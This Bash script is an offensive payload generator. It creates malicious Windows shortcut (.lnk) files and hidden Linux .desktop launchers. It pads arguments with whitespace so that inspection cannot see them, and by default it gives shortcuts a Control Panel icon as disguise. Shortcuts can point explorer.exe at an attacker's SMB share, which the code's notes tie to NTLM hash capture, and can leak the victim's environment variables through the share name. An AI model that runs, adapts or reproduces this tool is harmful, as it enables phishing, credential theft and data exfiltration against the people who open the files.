#!/usr/bin/env bash

set -euo pipefail

BLUE="\033[1;34m"
GREEN="\033[1;32m"
RED="\033[1;31m"
RESET="\033[0m"

# Set the WINEPREFIX_DIRECTORY to the user's home directory
WINEPREFIX_DIRECTORY="${HOME}/.wine"

PAYLOAD=""
COMMAND=""
ARGUMENTS=""
IP=""
METHOD=""
ENVIRONMENT=""
SHARE=""
NAME=""
DESCRIPTION=""
ICON=""
WINDOW=""
WORKINGDIRECTORY=""
OUTPUT=""
VERBOSE=0
DEBUG=0
VERSION=0

function check_program() {
    type -P "${1}" 2>/dev/null
}

function _print() {
    local text="${1}"

    echo -ne "${text}"
}

function println() {
    local text="${1}"

    echo -e "${text}"
}

function info() {
    local message="${1}"
    local color="${BLUE}[*]${RESET}"

    println "${color} ${message}"
}

function fin() {
    local message="${1}"
    local color="${GREEN}[*]${RESET}"

    println "${color} ${message}"
}

function error() {
    local message="${1}"
    local color="${RED}[*]${RESET}"

    println "${color} ${message}"
}

function quit() {
    local code="${1}"

    ((code != 0)) && info "Terminating program..."
    exit "${1}"
}

function check_dependencies() {
    local -a programs=("wine" "desktop-file-edit")
    local -a missing=()
    local -a powershell=("${WINEPREFIX_DIRECTORY}/drive_c/Program Files/PowerShell/"*/pwsh.exe)

    if [[ ! -d "${WINEPREFIX_DIRECTORY}" ]]
    then
        error "Directory not found: ${WINEPREFIX_DIRECTORY}. WINEPREFIX directory has not been initialized!"
        quit 1
    fi

    for program in "${programs[@]}"
    do
        if [[ -z $(check_program "${program}") ]]
        then
            if [[ "${program}" == "desktop-file-edit" ]]
            then
                missing+=("desktop-file-utils")
            else
                missing+=("${program}")
            fi
        fi
    done

    shopt -s nullglob
    [[ ! -f "${powershell[0]}" ]] && missing+=("powershell")
    shopt -u nullglob

    if ((${#missing[@]} > 0))
    then
        error "Required dependencies: ${missing[*]}"
        quit 1
    fi
}

function random_string() {
    local -a characters=({a..z} {A..Z})
    local length=$((RANDOM % 11 + 6))  # A length of characters between 6 and 16
    local string=""
    local random_index

    for ((i = 0; i < length; i++))
    do
        random_index=$((RANDOM % ${#characters[@]}))
        string+=${characters[$random_index]}
    done

    echo "${string}"
}

: <<-'TODO'
\x09 -> Horizontal tab (\t)
\x0A -> Line Feed (\n)
\x0B -> Vertical tab
\x0C -> Form Feed
\x0D -> Carriage Return
TODO
function fill_padding() {
    local target_executable="${1}"
    local arguments_string="${2}"
    local method="${3}"

    function spaces() {
        local mode="${1}"
        local boundary # Target dialog box's boundary
        local output=""
        local whitespaces

        # Contain arguments inside the box's boundary but will be inspected through properties
        if [[ "${mode}" == "visible" ]]
        then
            boundary=44
        elif [[ "${mode}" == "invisible" ]] # Push arguments outside the box's boundary and it won't be inspected through properties
        then
            boundary=260
        fi

        # If the first argument is already close to or exceeds the boundary,
        # we need minimal spacing
        if ((${#target_executable} >= boundary))
        then
            # First argument already fills most/all visible space
            whitespaces=1
        else
            # Calculate whitespace needed to push second argument beyond visible boundary
            # We want the second argument to start after the visible area
            whitespaces=$((boundary - ${#target_executable} + 1))
        fi

        # Generate the whitespace padding
        local padding=""
        for ((i = 0; i < whitespaces; i++))
        do
            padding+=" "
        done

        # Construct the final output
        output="${padding}${arguments_string}"

        println "${output}"
    }

    case "${method}" in
        "vspaces")
            spaces "visible"
            ;;
        "ispaces")
            spaces "invisible"
            ;;
        esac
}

function shell_link() {
    local command="${COMMAND//\\/\\\\}"
    local arguments="${ARGUMENTS//\\/\\\\}"
    local name="${NAME//\\/\\\\}"
    local description="${DESCRIPTION//\\/\\\\}"
    local unc_path_pattern="^\\\\"
    local drive_pattern="^([[:alpha:]]:)([/\\\\]?.*|$)"
    local -A windowstyle=(
        [normal]=1
        [maximized]=3
        [minimized]=7
    )
    local -a execute=("WINEDEBUG=-all" "WINEARCH=win64"
            "WINEPREFIX='${WINEPREFIX_DIRECTORY}'" "wine")
    local temp
    local temporary_file
    local script

    script="\$WScriptShell = New-Object -ComObject WScript.Shell\n"
    script+="\$ShortcutPath = \"${OUTPUT}\"\n"
    script+="\$Shortcut = \$WScriptShell.CreateShortcut(\$ShortcutPath)\n"

    if [[ -n "${command}" ]]
    then
        if [[ "${command}" =~ ${unc_path_pattern} ]] # Checks for UNC path
        then
            error "Wine has limitation for TargetPath when specifying a UNC path."
            info "Specify the IP address (-i) instead."
            quit 1
        elif [[ "${command}" =~ ${drive_pattern} ]] # Checks the drive letter letter
        then
            if [[ -z "${arguments}" ]]
            then
                error "Command and arguments must be passed!"
                quit 1
            fi
        else
            error "Invalid drive letter!"
            println "TargetPath: '${command}'"
            quit 1
        fi
    elif [[ -n "${IP}" ]] # Checks if IP is passed if command is not passed
    then
        local unc
        if [[ -z "${SHARE}" ]]
        then
            SHARE="$(random_string)"
            if [[ -n "${ENVIRONMENT}" ]]
            then
                while IFS="," read -ra variables
                do
                    for variable in "${variables[@]}"
                    do
                        temp+="%${variable}%,"
                    done
                done <<< "${ENVIRONMENT}"
                # Remove trailing comma
                ENVIRONMENT="${temp%,}"
                SHARE="${SHARE}_${ENVIRONMENT}"
            fi

            if [[ -z "${NAME}" ]]
            then
                unc="\\\\\\${IP}\\\\${SHARE}"
            elif [[ -n "${NAME}" ]]
            then
                unc="\\\\\\${IP}\\\\${SHARE},select,${NAME}"
            fi
        elif [[ -n "${SHARE}" ]]
        then
            if [[ -z "${NAME}" ]]
            then
                unc="\\\\\\${IP}\\\\${SHARE}"
            elif [[ -n "${NAME}" ]]
            then
                unc="\\\\\\${IP}\\\\${SHARE},select,${NAME}"
            fi
        fi

        # Escape the escape character (\e)
        command="C:\\Windows\\\\explorer.exe"
        arguments="/root,\"\\${unc}\""
    else
        error "You must provide either -c (command) or -i (IP) for 'lnk' payload."
        quit 1
    fi
    # TODO: test it just to be sure including NTLM hash grab
    # TODO: Test the spaces method

    if [[ -n "${METHOD}" ]]
    then
        if [[ "${METHOD}" == "vspaces" ]]
        then
            arguments=$(fill_padding "${command}" "${arguments}" "${METHOD}")
        elif [[ "${METHOD}" == "ispaces" ]]
        then
            arguments=$(fill_padding "${command}" "${arguments}" "${METHOD}")
        else
            error "Available methods are: 'vspaces' and 'ispaces"
        fi
    fi

    # Literally a feature in Windows
    # so better thanks Microsoft user ;)
    if (("${#arguments}" >= 4096))
    then
        error "Arguments must not exceed more than 4096 characters"
        quit 1
    else
        script+="\$Shortcut.TargetPath = \"${command}\"\n"
        script+="\$Shortcut.Arguments = \"${arguments}\"\n"
    fi

    if [[ -n "${description}" ]]
    then
        script+="\$Shortcut.Description = \"${description}\""
    fi

    # Using a custom index icon
    if [[ -n "${ICON}" ]]
    then
        script+="\$Shortcut.IconLocation = '${ICON}'\n"
    elif [[ -z "${ICON}" ]] # Will set to control panel icon by default
    then
        script+="\$Shortcut.IconLocation = 'shell32.dll,21'\n"
    fi

    if [[ -n "${WINDOW}" ]]
    then
        if [[ -z "${windowstyle[${WINDOW}]+_}" ]]
        then
            error "Invalid window style: ${WINDOW}"
            quit 1
        fi
        script+="\$Shortcut.WindowStyle = ${windowstyle[${WINDOW}]}\n"
    fi

    if [[ -n "${WORKINGDIRECTORY}" ]]
    then
        script+="\$Shortcut.WorkingDirectory = '${WORKINGDIRECTORY}'\n"
    fi

    script+="\$Shortcut.Save()\n"

    # Save the temporary PowerShell script then remove it after generation
    temporary_file=$(mktemp --suffix '.ps1')
    echo -e "${script}" > "${temporary_file}"

    if ((DEBUG == 1))
    then
        eval "${execute[*]} pwsh.exe -ExecutionPolicy Bypass -File ${temporary_file}"
    else
        eval "${execute[*]} pwsh.exe -ExecutionPolicy Bypass -File ${temporary_file} 2>/dev/null"
    fi
    # TODO: Test it to ensure the error occurs
    if [[ ! -f "${OUTPUT}" ]]
    then
        error "Something went wrong with the payload generation!"
        quit 1
    fi

    fin "Payload has been generated!"
    if ((VERBOSE == 1))
    then
        [[ -n "${command}" ]] && println "TargetPath: ${command}"
        [[ -n "${arguments}" ]] && println "Arguments: ${arguments}"
        [[ -n "${IP}" ]] && println "IP Address/Computer Name: ${IP}"
        [[ -n "${SHARE}" ]] && println "Share name: ${SHARE}"
        [[ -n "${description}" ]] && println "Description: ${description}"
        [[ -n "${ICON}" ]] && println "Icon: ${ICON}"
        [[ -n "${WINDOW}" ]] && println "WindowStyle: ${WINDOW}"
        [[ -n "${WORKINGDIRECTORY}" ]] && println "Working Directory: ${WORKINGDIRECTORY}"
    fi

    [[ -f "${temporary_file}" ]] && rm -f "${temporary_file}"
}

function desktop_entry() {
    local command="${COMMAND//\\/\\\\}"
    local arguments="${ARGUMENTS//\\/\\\\}"
    local name="${NAME//\\/\\\\}"
    local description="${DESCRIPTION//\\/\\\\}"
    local -a execute=("desktop-file-edit")

    if [[ -n "${name}" ]]
    then
        execute+=("--set-key='Encoding'")
        execute+=("--set-value='UTF-8'")
        execute+=("--set-key='Name'")
        execute+=("--set-value='${name}'")
        execute+=("--set-key='Version'")
        execute+=("--set-value='1.0'")
    else
        error "Name must be passed!"
        quit 1
    fi

    if [[ -n "${METHOD}" ]]
    then
        error "No available methods for desktop entry!"
        quit 1
    fi

    if [[ -n "${command}" && -n "${arguments}" ]]
    then
        if (("${#arguments}" >= 2090326))
        then
            error "Arguments must not exceed more than 2090326 characters"
            quit 1
        fi
        execute+=("--set-key='Exec'")
        execute+=("--set-value='${command} ${arguments}'")
    elif [[ -n "${command}" ]]
    then
        execute+=("--set-key='Exec'")
        execute+=("--set-value='${command}'")
    else
        error "At least command and/or arguments must be passed!"
        quit 1
    fi

    if [[ -n "${description}" ]]
    then
        execute+=("--set-comment='${description}'")
    fi

    if [[ -n "${WORKINGDIRECTORY}" ]]
    then
        execute+=("--set-key='Path'")
        execute+=("--set-value='${WORKINGDIRECTORY}'")
    fi

    if [[ -n "${ICON}" ]]
    then
        execute+=("--set-icon='${ICON}'")
    fi

    if [[ -z "${WINDOW}" ]]
    then
        execute+=("--set-key=\"Terminal\"")
        execute+=("--set-value=\"false\"")
    elif [[ -n "${WINDOW}" ]] # Make the application run in terminal if set to true otherwise false
    then
        if [[ "${WINDOW}" == "true" || "${WINDOW}" == "false" ]]
        then
            execute+=("--set-key=\"Terminal\"")
            execute+=("--set-value=\"${WINDOW}\"")
        else
            error "The Terminal must be set either 'true' or 'false'!"
        fi
    fi
    execute+=("--set-key=\"Type\"")
    execute+=("--set-value=\"Application\"")
    # Do not appear in application menu
    execute+=("--set-key=\"NoDisplay\"")
    execute+=("--set-value=\"true\"")
    # The desktop entry must be usable and not hidden
    execute+=("--set-key=\"Hidden\"")
    execute+=("--set-value=\"false\"")
    execute+=("--remove-key=\"X-Desktop-File-Install-Version\"")
    touch "${OUTPUT}"

    if ((DEBUG == 1))
    then
        eval "${execute[*]} ${OUTPUT}"
    else
        eval "${execute[*]} ${OUTPUT} &>/dev/null"
    fi

    fin "Payload has been generated!"
    if ((VERBOSE == 1))
    then
        [[ -n "${NAME}" ]] && println "Name: ${NAME}"

        if [[ -n "${command}" ]]
        then
            println "Exec: ${command}"
        elif [[ -n "${command}" && -n "${arguments}" ]]
        then
            println "Exec: ${command} ${arguments}"
        fi

        [[ -n "${description}" ]] && println "Comment: ${description}"
        [[ -n "${ICON}" ]] && println "Icon: ${ICON}"
        [[ -n "${WINDOW}" ]] && println "Terminal: ${WINDOW}"
        [[ -n "${WORKINGDIRECTORY}" ]] && println "Path: ${WORKINGDIRECTORY}"
    fi
}

function generate() {
    local payload="${1}"

    if [[ -f "${OUTPUT}" ]]
    then
        rm -f "${OUTPUT}"
    fi

    case "${payload}" in
        "lnk")
            shell_link
            ;;
        "desktop")
            desktop_entry
            ;;
        *)
            error "Available payloads are: 'lnk' and 'desktop'!"
            quit 1
            ;;
        esac
}
# TODO: Check with C# PInvoke that could generate it with a Hotkey -H, --hotkey
# I need to tell the user how to fucking use me
function usage() {
    println "Usage: $(basename "${0}") <flags>
    -p, --payload                       Specify a payload module ('lnk', 'desktop').
    -c, --command                       Specify a command to execute.
    -a, --arguments                     Optionally pass the arguments (except it is
                                        mandatory for 'lnk' payload module).
    -i, --ip                            Specify an IP address/hostname (applies with
                                        'lnk' payload module).
    -e, --environment                   Optionally pass the environment variables to
                                        exfiltrate.
    -m, --method                        Specify the method. Available options for 'lnk'
                                        payload module: 'spaces'.
    -s, --share                         Specify an SMB share (applies with -h flag
                                        when it's optional for 'lnk' payload module).
    -n, --name                          Specify a name. It is optional when 'lnk' is specified.
                                        payload module is specified (applies with -h flag).
                                        For 'desktop' payload module it is mandatory.
    -d, --description                   Specify the description of the payload.
    -ic, --icon                         Specify a custom icon.
    -w, --window                        Specify a window. For 'lnk' payload windowstyle
                                        'normal' is set by default if not specified.
                                        The available windowstyles are: 'normal', 'maximized',
                                        and 'minimized'. For 'desktop' payload it is set to
                                        'false', the available options are: 'true' and 'false'.
    -wd, --workingdirectory             Specify a working directory.
    -v, --verbose                       Display more output information.
    -D, --debug                         Debug the payload generation.
    -o, --output                        Specify an output.
    -V, --version                       Display the program's version number.
    -h, --help                          Display the help menu."
    quit 0
}

function main() {
    local directory
    local version="v1.5"

    if ((${#} == 0))
    then
        usage
    fi

    while ((${#} > 0))
    do
        case "${1}" in
            -p | --payload)
                PAYLOAD="${2,,}"
                shift 2
                ;;
            -c | --command)
                COMMAND="${2}"
                shift 2
                ;;
            -a | --arguments)
                ARGUMENTS="${2}"
                shift 2
                ;;
            -m | --method)
                METHOD="${2,,}"
                shift 2
                ;;
            -i | --ip)
                IP="${2}"
                shift 2
                ;;
            -e | --environment)
                ENVIRONMENT="${2}"
                shift 2
                ;;
            -s | --share)
                SHARE="${2}"
                shift 2
                ;;
            -n | --name)
                NAME="${2}"
                shift 2
                ;;
            -d | --description)
                DESCRIPTION="${2}"
                shift 2
                ;;
            -ic | --icon)
                ICON="${2}"
                shift 2
                ;;
            -w | --window)
                WINDOW="${2,,}"
                shift 2
                ;;
            -wd | --workingdirectory)
                WORKINGDIRECTORY="${2}"
                shift 2
                ;;
            -v | --verbose)
                VERBOSE=1
                shift
                ;;
            -D | --debug)
                DEBUG=1
                shift
                ;;
            -o | --output)
                OUTPUT="${2}"
                shift 2
                ;;
            -V | --version)
                VERSION=1
                shift
                ;;
            -h | --help)
                usage
                ;;
            *)
                error "Invalid option: ${1}" >&2
                quit 1
                ;;
        esac
    done

    trap quit SIGINT
    check_dependencies

    ((VERSION == 1)) && echo "${0} version: ${version}" && quit 0

    # Require either -c or -i (but not both) for 'lnk' payloads
    if [[ "${PAYLOAD}" == "lnk" ]]
    then
        if [[ -n "${COMMAND}" && -n "${IP}" ]]
        then
            error "Cannot use both -c (command) and -i (IP) together for 'lnk' payload. Choose one."
            quit 1
        elif [[ -z "${COMMAND}" && -z "${IP}" ]]
        then
            error "You must provide either -c (command) or -i (IP) for 'lnk' payload."
            quit 1
        fi
    fi

    if [[ -n "${OUTPUT}" ]]
    then
        directory=$(dirname "${OUTPUT}")

        if [[ -d "${directory}" && -w "${directory}" ]]
        then
            generate "${PAYLOAD}"
        elif [[ ! -d "${directory}" ]]
        then
            error "Directory path does not exist: ${directory}"
        elif [[ -d "${directory}" && ! -w "${directory}" ]]
        then
            error "Permission denied: Cannot generate payload to directory path: ${directory}."
        fi
    else
        error "Output file must be specified!"
        quit 1
    fi
}

main "${@}"
